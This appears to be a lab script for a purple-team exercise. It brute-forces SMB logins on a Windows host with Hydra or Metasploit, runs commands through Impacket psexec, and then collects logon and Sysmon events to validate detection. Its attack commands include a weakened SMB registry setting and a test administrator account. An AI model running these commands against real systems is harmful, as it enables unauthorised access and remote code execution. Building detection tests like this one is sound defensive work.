# Chain 2: Brute Force to Authenticated Execution
# Attacker: Kali Linux (192.168.126.128)
# Victim:   Windows BOBBY (192.168.126.1)
# Techniques: T1110.001 + T1078 + T1059

# ============================================================
# PREREQUISITES — Windows (run as Administrator before simulation)
# ============================================================

# Create test account for brute force target
# net user labuser Password123! /add
# net localgroup "Remote Desktop Users" labuser /add
# net localgroup Administrators labuser /add

# Enable SMB access
# Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" `
#     -Name "RestrictNullSessAccess" -Value 0

# ============================================================
# STEP 1 — Kali: Password list brute force via SMB (Hydra)
# ============================================================

# Create password wordlist
cat > /tmp/passwords.txt << EOF
wrongpass1
wrongpass2
wrongpass3
wrongpass4
wrongpass5
Password123!
EOF

# Run Hydra brute force against Windows SMB
hydra -l labuser -P /tmp/passwords.txt smb://192.168.126.1 -t 1 -W 2 -v

# Alternative: Metasploit SMB login scanner
# msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS 192.168.126.1; set SMBUser labuser; set PASS_FILE /tmp/passwords.txt; set THREADS 1; run"

# ============================================================
# STEP 2 — Kali: Execute command after successful auth (PsExec equivalent)
# ============================================================

# Using Impacket psexec after successful auth
# impacket-psexec labuser:Password123\!@192.168.126.1 cmd.exe

# Using smbclient
# smbclient //192.168.126.1/C$ -U labuser%Password123!

# ============================================================
# STEP 3 — Windows: Capture telemetry
# ============================================================

# $since = (Get-Date).AddMinutes(-10)
#
# WinSec 4625 (failed logons)
# Get-WinEvent -LogName Security |
#     Where-Object { $_.Id -eq 4625 -and $_.TimeCreated -gt $since } |
#     Select-Object Id, TimeCreated,
#         @{N="Computer";E={$_.MachineName}},
#         @{N="Message";E={$_.Message}} |
#     ConvertTo-Json -Depth 5 |
#     Out-File "telemetry\raw\chain2_brute_exec\winsec_4625.json" -Encoding UTF8
#
# WinSec 4624 (successful logon)
# Get-WinEvent -LogName Security |
#     Where-Object { $_.Id -eq 4624 -and $_.TimeCreated -gt $since } |
#     Select-Object Id, TimeCreated,
#         @{N="Computer";E={$_.MachineName}},
#         @{N="Message";E={$_.Message}} |
#     ConvertTo-Json -Depth 5 |
#     Out-File "telemetry\raw\chain2_brute_exec\winsec_4624.json" -Encoding UTF8
#
# Sysmon EID 1 (process execution under authenticated session)
# Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
#     Where-Object { $_.Id -eq 1 -and $_.TimeCreated -gt $since } |
#     Select-Object Id, TimeCreated,
#         @{N="Computer";E={$_.MachineName}},
#         @{N="Message";E={$_.Message}} |
#     ConvertTo-Json -Depth 5 |
#     Out-File "telemetry\raw\chain2_brute_exec\sysmon_eid1.json" -Encoding UTF8

# ============================================================
# STEP 4 — Validate
# ============================================================

# python Pipeline/run_pipeline.py \
#     --input-dir telemetry/raw/chain2_brute_exec \
#     --output reports/validation/chain2_validation.json \
#     --window 300

# python Pipeline/replay_harness.py --test chain2_brute_to_exec --verbose
